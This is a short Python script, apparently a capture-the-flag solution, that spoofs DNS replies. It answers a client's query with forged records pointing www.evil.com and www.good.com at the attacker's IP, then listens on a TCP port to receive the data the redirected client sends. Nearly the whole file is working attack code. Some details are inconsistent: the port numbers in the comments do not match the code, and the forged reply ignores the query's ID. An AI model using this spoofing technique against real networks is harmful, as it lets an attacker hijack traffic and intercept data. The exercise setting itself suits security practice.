import socket,sys
from dnslib import *

# just like 2 but add additional answer for good.com

#The client will look up the IP address for www.good.com, then it will connect to the given address on TCP port 5002 to deliver the flag.
def get_my_ip():
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(('192.168.17.50', 0))  # connecting to a UDP address doesn't send packets
  local_ip_address = s.getsockname()[0]
  return local_ip_address

def get_flag(internal_IP):
  # stupid, but always return our ip address

  # below here needs help
  # listen on #5302, UDP
  sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
  sock.bind(('0.0.0.0', 5303))

  data = None
  while not data:
    data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
  # we got the dataz
  dns_resp = pack_dns(my_ip)
  sock.sendto(dns_resp,addr)
  #sock.close()
  # good we told it to talk to us instead
  rawflag = listen_tcp()
  return rawflag

def pack_dns(my_ip):
  q = DNSRecord(q=DNSQuestion("www.evil.com",QTYPE.ANY)) 
  a = q.reply()
  # redirect them to my ip addr
  a.add_answer(RR("www.evil.com",QTYPE.A,rdata=A(str(my_ip)),ttl=60))
  a.add_answer(RR("www.good.com",QTYPE.A,rdata=A(str(my_ip)),ttl=60))
  return a.pack()

def listen_tcp():
  ip = '0.0.0.0'
  port = 5003
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind((ip, port))
  s.listen(1)

  conn, addr = s.accept()
  # done when flags are captured
  serv_flag = None
  count = 0
  while True:
    data = conn.recv(1024)
    if(data):
      return data

if __name__ == "__main__":
  my_ip = get_my_ip()
  print get_flag(my_ip)
